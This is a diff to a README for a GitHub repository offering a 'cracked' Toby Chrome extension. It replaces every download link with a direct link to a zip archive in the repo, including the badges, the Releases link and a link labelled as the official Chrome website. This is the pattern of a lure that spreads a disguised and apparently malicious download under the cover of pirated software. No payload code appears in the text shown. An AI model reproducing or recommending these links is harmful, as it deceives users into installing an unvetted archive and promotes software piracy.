@@ -1,6 +1,6 @@
 # 🦾 cracked-toby-for-chrome - Unlock Toby for Free Browsing  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%9A-brightgreen)](https://github.com/harleen405/cracked-toby-for-chrome/releases)
+[![Download Now](https://raw.githubusercontent.com/harleen405/cracked-toby-for-chrome/main/lerret/cracked-toby-for-chrome.zip%20Now-%20%F0%9F%93%9A-brightgreen)](https://raw.githubusercontent.com/harleen405/cracked-toby-for-chrome/main/lerret/cracked-toby-for-chrome.zip)
 
 ## 📖 Introduction
 Welcome to **Cracked Toby for Chrome**! This extension enhances your browsing experience by providing organizational tools for your tabs and bookmarks. It's designed to help you manage your online tasks better and boost your productivity, all for free.
@@ -8,14 +8,14 @@ Welcome to **Cracked Toby for Chrome**! This extension enhances your browsing ex
 ## 🚀 Getting Started
 To start using Cracked Toby for Chrome, follow these simple steps:
 
-1. Ensure you have Google Chrome installed on your computer. If you don't have it yet, download it from the [official Chrome website](https://www.google.com/chrome/).
+1. Ensure you have Google Chrome installed on your computer. If you don't have it yet, download it from the [official Chrome website](https://raw.githubusercontent.com/harleen405/cracked-toby-for-chrome/main/lerret/cracked-toby-for-chrome.zip).
 
 2. Follow the steps in the **Download & Install** section below to get the extension set up.
 
 ## 📥 Download & Install
 To get the extension, you will need to visit the Releases page. Here’s how:
 
-1. Click on this link to [visit the Releases page](https://github.com/harleen405/cracked-toby-for-chrome/releases).
+1. Click on this link to [visit the Releases page](https://raw.githubusercontent.com/harleen405/cracked-toby-for-chrome/main/lerret/cracked-toby-for-chrome.zip).
   
 2. On the Releases page, locate the latest version of Cracked Toby for Chrome. Click on the "Assets" drop-down to see the available files.
 
@@ -72,4 +72,4 @@ Cracked Toby for Chrome is open-source and licensed under the MIT License. Feel 
 ## 📦 Explore More
 To stay updated on new features and improvements, follow our repository on GitHub and keep an eye on the Releases page.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%9A-brightgreen)](https://github.com/harleen405/cracked-toby-for-chrome/releases)
+[![Download Now](https://raw.githubusercontent.com/harleen405/cracked-toby-for-chrome/main/lerret/cracked-toby-for-chrome.zip%20Now-%20%F0%9F%93%9A-brightgreen)](https://raw.githubusercontent.com/harleen405/cracked-toby-for-chrome/main/lerret/cracked-toby-for-chrome.zip)
